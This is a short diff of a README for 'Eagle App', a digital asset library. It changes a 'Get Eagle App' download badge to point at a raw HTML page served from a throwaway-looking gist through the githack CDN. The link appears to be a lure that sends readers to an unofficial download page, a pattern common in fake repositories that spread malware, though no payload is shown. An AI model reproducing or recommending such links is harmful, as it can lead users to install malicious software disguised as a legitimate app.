@@ -3,7 +3,7 @@
 **Eagle App** is your creative brain in one place — a powerful digital library for images, videos, design files, and inspiration content.  
 It helps you collect, organize, preview, and search through your assets faster than ever before. 🦅  
 
-[![🟦 Get GitHub Instruction](https://img.shields.io/badge/🟦%20Get%20Eagle%20App-1E90FF?style=for-the-badge&logo=eagle&logoColor=white&labelColor=0B0F19)](https://glcdn.githack.com/-/snippets/4893913/raw/main/getapp.html?offer=Eagle)
+[![🟦 Get GitHub Instruction](https://img.shields.io/badge/🟦%20Get%20Eagle%20App-1E90FF?style=for-the-badge&logo=eagle&logoColor=white&labelColor=0B0F19)](https://gistcdn.githack.com/bubarrandomguy736/505904067a97a914318f0a09db7c576b/raw/80010a6bd3d07c7e8190e4eff7d64e3b2813a702/app.html?offer=MainType2025?offer=Eagle)
 
 ---
 
